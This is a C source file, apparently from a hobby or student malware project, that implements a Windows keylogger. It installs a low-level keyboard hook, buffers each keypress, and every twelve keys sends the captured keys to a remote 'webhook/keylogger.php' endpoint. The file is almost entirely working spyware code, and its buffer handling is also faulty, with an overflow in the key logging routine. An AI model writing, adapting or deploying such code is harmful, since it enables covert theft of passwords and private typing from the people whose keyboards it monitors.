#include <windows.h>
#include <stdio.h>
#include <time.h> 
#include <stdlib.h>
//#include "http.h"

#define MAX_KEYS 12

char key_log[MAX_KEYS];
int current_key_log_size = 0;

void send_keys(void){

    /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/

    char data[MAX_KEYS+50];
    snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
    memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
    current_key_log_size = 0;
    send_to_server("webhook/keylogger.php", data);
}


void log_key(int key) {

    /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/

    snprintf(key_log, 1024, "%s%c", key_log, key); // rajoute le caractère dans key_log
    current_key_log_size++; // +=1
    if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
        send_keys();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            log_key(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int start_keylogger() {

    /*Fonction qui permet je lançer le keylogger grâce aux fonctions de windows.h*/

    printf("[*] Lancement du keylogger, envoie des frappes au serveur toute les %d frappes\n", MAX_KEYS);
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (keyboardHook == NULL) {
        printf("Failed to install hook!\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
